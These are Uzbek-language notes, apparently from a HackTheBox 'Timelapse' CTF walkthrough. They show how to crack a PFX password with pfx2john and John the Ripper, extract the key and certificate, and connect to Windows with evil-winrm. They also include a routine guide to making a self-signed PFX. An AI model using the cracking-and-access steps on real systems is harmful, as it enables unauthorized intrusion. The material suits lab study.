**PFX fayl parolini aniqlash?**  
PFX faylni tekshirish.
 - **# openssl pkcs12 -info -in mycertificate.pfx**   
1. Hash yaratish.
 - **# pfx2john fayl.pfx > fayl.hash**
2. John the Ripper bilan parolni ochish.
 - **# john fayl.hash --wordlist=/usr/share/wordlists/rockyou.txt --force**
3. Kalit va sertifikatni olish.  
   A. Shaxsiy kalitni chiqarish:
    - **# openssl pkcs12 -in fayl.pfx -nocerts -out fayl.key-enc**
    - Enter Import Password:(hash orqali aniqlangan parol (Brute force paroli))  Enter PEM pass phrase(Shaxsiy kalit uchun yangi parol kiritish): Verifying - Enter PEM pass phrase(qayta kiritish):
  B. Sertifikatni chiqarish:   
    - **# openssl pkcs12 -in fayl.pfx -clcerts -nokeys -out fayl.crt**   
  C. Shaxsiy Kalitni shifrdan yechish (Decrypt):
    - **# openssl rsa -in fayl.key-enc -out fayl.key**
    - yuqorida kiritilgan yangi parol kiritiladi.
4. evil-winrm orqali tizimga ulanish. (evil-winrm — bu Windows Remote Management (WinRM) protokoliga asoslangan vosita bo'lib, Windows tizimlariga masofaviy ulanish uchun ishlatiladi.)
 - **# evil-winrm -i <IP> -k fayl.key -c fayl.crt -S -r timelapse**    

Asosiy parametrlar:   
**-i <IP>** – Masofaviy Windows mashinasining IP manzili. (Masalan: 10.10.10.10)  
**-k fayl.key** – Shaxsiy kalit (Private Key) fayli. Bu kalit .pfx fayldan ajratib olingan bo'lishi kerak.  
**-c fayl.crt** – Sertifikat (Certificate) fayli. Bu ham .pfx fayldan chiqarib olingan.  
**-S** – HTTPS orqali ulanish. Bu parametr WinRM xizmatiga xavfsiz (TLS) ulanishni ta'minlaydi.  
**-r timelapse** – Bu parametr ressurs nomini ko'rsatadi. Bu misolda "timelapse" deb nomlangan domen yoki ma'lum bir ulanish konteksti kiritilgan. (Bu CTF topshirig'ida maxsus muhit yoki ulanish nuqtasi bo'lishi mumkin.)    
 - **# evil-winrm -i 10.10.10.10 -k private.key -c certificate.crt -S**  
https://www.hackingarticles.in/timelapse-hackthebox-walkthrough/


**PFX fayl yaratish**
1. OpenSSL o'rnatilganligini tekshirish
 - **# openssl version**
 - Agar o'rnatilmagan bo'lsa (**# sudo apt update && sudo apt install openssl**)
2. Shaxsiy kalit (Private Key) yaratish (256-bitli RSA shaxsiy kalit yaratish)
 - **# openssl genrsa -out private.key 2048**
 -  **private.key** — bu shaxsiy kalit bo'lib, maxfiy saqlanishi kerak.
3.  Sertifikat uchun talab (CSR - Certificate Signing Request) yaratish
 - **# openssl req -new -key private.key -out request.csr**
4. Self-Signed Certificate yaratish.
 - **# openssl x509 -req -days 365 -in request.csr -signkey private.key -out certificate.crt**
5. PFX (PKCS#12) faylini yaratish.
 - **# openssl pkcs12 -export -out mycertificate.pfx -inkey private.key -in certificate.crt**
6. Yaratilgan PFX faylni tekshirish.
 - **# openssl pkcs12 -info -in mycertificate.pfx**   

